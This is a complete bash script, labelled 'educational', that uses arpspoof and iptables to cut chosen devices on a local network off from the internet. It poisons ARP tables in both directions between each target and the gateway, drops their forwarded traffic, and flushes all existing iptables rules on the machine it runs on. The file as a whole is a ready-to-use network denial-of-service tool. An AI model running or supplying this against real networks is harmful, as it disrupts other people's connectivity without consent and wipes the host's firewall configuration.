#!/usr/bin/env bash
set -e

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

# Detect Interface
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
echo "Enter Wireless Interface (press Enter for default: $WLAN):"
read -p "> " WLN
INTERFACE="${WLN:-$WLAN}"

# Detect Gateway IP
GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
echo "Enter Router Gateway IP (press Enter for default: $GW):"
read -p "> " INET
GATEWAY="${INET:-$GW}"

# Detect Device IP
IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
echo "Enter Device IP (press Enter for default: $IP):"
read -p "> " DEVIP
MYIP="${DEVIP:-$IP}"

# Get Target IPs (no default, must specify)
echo "Enter one or more target IPs (space-separated, e.g. 192.168.1.110 192.168.1.111):"
read -p "> " IPS
if [[ -z "$IPS" ]]; then
  echo "No target IPs entered. Exiting."
  exit 1
fi
TARGET_IPS="$IPS"

echo ""
# Prompt configuration
echo "Your Arpspoof Configurations..."
echo ""
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "MYIP:      | $MYIP"
echo "TARGETS:   | $TARGET_IPS"

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t filter -F FORWARD

# Remove Iptables rules (stopper script)
STOP_SCRIPT="/usr/local/bin/netkiller-stop"
cat > "$STOP_SCRIPT" << EOF
#!/usr/bin/env bash
iptables -F
iptables -X
iptables -t nat -F
iptables -t filter -F FORWARD
pkill arpspoof
echo "Restoring the Connections..."
EOF
chmod 755 "$STOP_SCRIPT"

for TARGET in $TARGET_IPS; do
    (
        # Block target ip traffic
        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP

        # Bidirectional Arp Spoofing
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
done

echo "Attack is running in the background...!!!"
echo "To stop, Run: sudo netkiller-stop"
